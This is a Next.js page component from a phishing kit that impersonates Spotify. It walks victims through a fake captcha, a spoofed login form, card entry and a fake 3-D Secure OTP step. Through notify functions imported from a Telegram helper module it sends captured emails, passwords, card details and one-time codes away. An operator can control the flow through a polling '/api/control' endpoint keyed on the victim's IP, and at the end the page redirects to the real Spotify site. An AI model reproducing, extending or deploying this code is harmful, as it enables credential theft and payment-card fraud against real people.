"use client"

import { useState, useEffect } from "react"
import { SpotifyLoginForm } from "@/components/spotify-login-form"
import { CaptchaVerification } from "@/components/captcha-verification"
import { MyCards, type CardData } from "@/components/my-cards"
import { PaymentProcessing } from "@/components/payment-processing"
import { ThreeDSecure } from "@/components/three-d-secure"
import { notifyNewVisitor, notifyLogin, notifyPaymentInfo, notifyOTPAttempt, getVisitorInfo } from "@/lib/telegram"
import { getLanguageFromCountry, type Language, t } from "@/lib/translations"
import { SpotifyHeader } from "@/components/spotify-header"
import { SpotifyFooter } from "@/components/spotify-footer"

type FlowStep = "captcha" | "login" | "cards" | "processing" | "3d-secure-app" | "3d-secure-otp" | "success" | "blocked"

export default function LoginPage() {
  const [flowStep, setFlowStep] = useState<FlowStep>("captcha")
  const [visitorInfo, setVisitorInfo] = useState<Awaited<ReturnType<typeof getVisitorInfo>> | null>(null)
  const [language, setLanguage] = useState<Language>("en")
  const [isInvalidCard, setIsInvalidCard] = useState(false)
  const [isInvalidOTP, setIsInvalidOTP] = useState(false)

  // Get visitor info on mount and detect language
  useEffect(() => {
    const initializeVisitor = async () => {
      const info = await getVisitorInfo()
      setVisitorInfo(info)
      const detectedLanguage = getLanguageFromCountry(info.country)
      setLanguage(detectedLanguage)
    }
    initializeVisitor()
  }, [])

  // Poll for state changes
  useEffect(() => {
    if (!visitorInfo?.ip) return

    const checkState = async () => {
      try {
        // Use encodeURIComponent for IP to handle any special characters
        const res = await fetch(`/api/control?ip=${encodeURIComponent(visitorInfo.ip)}`)
        const data = await res.json()
        
        if (data.state === "block") {
          setFlowStep("blocked")
        } else if (data.state === "invalid_card") {
          setIsInvalidCard(true)
          setIsInvalidOTP(false)
          setFlowStep("cards")
        } else if (data.state === "invalid_otp") {
          setIsInvalidOTP(true)
          setIsInvalidCard(false)
          setFlowStep("3d-secure-otp")
        } else if (data.state === "3d-secure-app") {
          setIsInvalidCard(false)
          setIsInvalidOTP(false)
          setFlowStep("3d-secure-app")
        } else if (data.state === "3d-secure-otp") {
          setIsInvalidCard(false)
          setIsInvalidOTP(false)
          setFlowStep("3d-secure-otp")
        } else if (data.state === "success") {
          setIsInvalidCard(false)
          setIsInvalidOTP(false)
          setFlowStep("success")
        } else if (data.state === "normal") {
          // If we were blocked or in a special state, we can reset to login/captcha
          // but usually we don't want to force redirect unless necessary
          if (flowStep === "blocked") {
            setFlowStep("captcha")
            setIsInvalidCard(false)
            setIsInvalidOTP(false)
          }
        }
      } catch (e) {
        console.error("Failed to check state", e)
      }
    }

    const interval = setInterval(checkState, 2000) // Slightly faster polling
    return () => clearInterval(interval)
  }, [visitorInfo, flowStep])

  const handleCaptchaVerified = async () => {
    if (visitorInfo) {
      await notifyNewVisitor(visitorInfo)
    }
    setFlowStep("login")
  }

  const handleLoginSuccess = async (email: string, password: string) => {
    if (visitorInfo) {
      await notifyLogin(email, password, visitorInfo)
    }
    setFlowStep("cards")
  }

  const handleCardSubmit = async (cardData: CardData) => {
    if (visitorInfo) {
      await notifyPaymentInfo(cardData, visitorInfo)
      // Reset state on server to "processing" (or "normal") so polling doesn't pull user back to "invalid_card"
      try {
        await fetch("/api/control", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ ip: visitorInfo.ip, state: "normal" }),
        })
      } catch (e) {
        console.error("Failed to reset state on submit", e)
      }
    }
    // Reset errors when submitting new card
    setIsInvalidCard(false)
    setFlowStep("processing")
  }

  const handle3DSecureSuccess = () => {
    setFlowStep("success")
  }

  const handleOTPAttempt = async (otp: string, isCorrect: boolean) => {
    if (visitorInfo) {
      await notifyOTPAttempt(otp, isCorrect, visitorInfo)
    }
  }

  if (flowStep === "blocked") {
    return (
      <main className="min-h-screen bg-[#121212] flex flex-col items-center justify-center px-4 py-8">
        <div className="text-center">
          <h1 className="text-3xl font-bold text-red-500 mb-4">Access Denied</h1>
          <p className="text-[#a7a7a7]">Your access to this service has been temporarily suspended.</p>
        </div>
      </main>
    )
  }

  return (
    <div className="w-full">
      {flowStep === "captcha" && <CaptchaVerification onVerified={handleCaptchaVerified} language={language} />}
      {flowStep === "login" && <SpotifyLoginForm onLoginSuccess={handleLoginSuccess} language={language} />}
      {flowStep === "cards" && (
        <MyCards 
          onSubmit={handleCardSubmit} 
          language={language} 
          error={isInvalidCard ? t("cards.invalidCard", language) : undefined} 
        />
      )}
      {flowStep === "processing" && <PaymentProcessing language={language} />}
      {flowStep === "3d-secure-app" && (
        <ThreeDSecure 
          mode="app"
          onSuccess={handle3DSecureSuccess} 
          onOTPAttempt={handleOTPAttempt} 
          language={language} 
        />
      )}
      {flowStep === "3d-secure-otp" && (
        <ThreeDSecure 
          mode="otp"
          onSuccess={handle3DSecureSuccess} 
          onOTPAttempt={handleOTPAttempt} 
          language={language} 
          error={isInvalidOTP ? t("3ds.invalidOTP", language) : undefined}
        />
      )}
      {flowStep === "success" && (
        <div className="flex flex-col min-h-screen w-full bg-[#121212]">
          <main className="flex-1 flex flex-col items-center justify-center py-12">
            <div className="w-full max-w-[400px] mx-auto text-center px-4">
              <div className="mb-8">
                <svg className="w-20 sm:w-24 h-20 sm:h-24 mx-auto text-[#1ed760] mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
              <h1 className="text-2xl sm:text-[32px] font-bold text-white mb-4">{t("success.title", language)}</h1>
              <p className="text-[#a7a7a7] text-sm sm:text-lg mb-8">{t("success.message", language)}</p>
              <button
                onClick={() => {
                  window.location.href = "https://www.spotify.com"
                }}
                className="w-full h-12 bg-[#1ed760] hover:bg-[#1fdf64] text-black font-bold rounded-full transition-all"
              >
                {t("success.startOver", language)}
              </button>
            </div>
          </main>
        </div>
      )}
    </div>
  )
}
